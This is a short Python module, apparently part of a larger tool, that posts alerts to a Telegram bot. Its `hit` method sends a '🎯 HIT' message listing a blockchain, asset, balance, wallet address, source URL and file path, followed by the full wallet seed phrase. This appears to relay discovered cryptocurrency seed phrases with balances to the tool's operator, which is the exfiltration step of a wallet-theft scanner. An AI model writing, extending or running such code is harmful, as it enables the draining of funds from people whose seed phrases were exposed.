"""Telegram notifications."""
from __future__ import annotations

import html
import logging

import httpx

log = logging.getLogger("notifier")


class Notifier:
    def __init__(self, token: str | None, chat: str | None):
        self.url = f"https://api.telegram.org/bot{token}/sendMessage" if token else None
        self.chat = chat

    async def send(self, text: str) -> None:
        if not self.url or not self.chat:
            log.info(text)
            return
        try:
            async with httpx.AsyncClient(timeout=15) as c:
                await c.post(self.url, json={"chat_id": self.chat, "text": text,
                                             "parse_mode": "HTML",
                                             "disable_web_page_preview": True})
        except httpx.HTTPError as exc:
            log.warning("telegram: %s", exc)

    async def hit(self, chain, asset, amount, address, url, seed, path, verdict=None):
        tag = f" [{verdict}]" if verdict else ""
        await self.send(
            f"🎯 <b>HIT{tag}</b>\n{html.escape(chain)} {html.escape(asset)} "
            f"<b>{html.escape(amount)}</b>\n<code>{html.escape(address)}</code>\n"
            f"{html.escape(url or '')}\n<code>{html.escape(path or '')}</code>\n\n"
            f"<b>SEED</b>\n<code>{html.escape(seed)}</code>"
        )